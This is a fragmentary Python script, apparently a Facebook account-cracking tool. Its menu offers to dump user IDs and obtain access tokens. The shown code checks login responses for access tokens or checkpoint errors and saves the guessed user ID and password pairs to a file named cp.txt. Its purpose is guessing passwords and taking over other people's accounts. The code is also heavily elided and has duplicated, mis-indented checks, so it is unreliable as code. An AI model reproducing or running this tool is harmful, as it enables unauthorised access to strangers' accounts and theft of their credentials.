...
def main():
	...
	print("\033[93;1m  [2] Dum user idz ")
	print("\033[94;1m  [3] How To Get Access Token")
	print("\033[96;1m  [4] Join Messenger  Group")
...
def log_sel():
	...
	if sel == "":
		print("\t\033[91;1m  SELECT OPTION JAN -_")
		log_sel()
		...
		xox("\n\t\033[91;1m AO NA WHATSAPP PR THORE GAPPE SHAPPMARE GA :)")
		sys.exit()
	else:
		print("")
...
def menu():
    ...
    logo()
    print("")
    print("\033[93;1m    ASSALMOALAIKUM   : \033[92;1m"+xn)
															...
															if "access_token" in q and "EAAA" in q:
																...
																if "www.facebook.com" in q["error_msg"]:
																	...
																	if "access_token" in q and "EAAA" in q:
																		...
																		if "www.facebook.com" in q["error_msg"]:
																			print(" \033[1;33m [Ahmedo-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
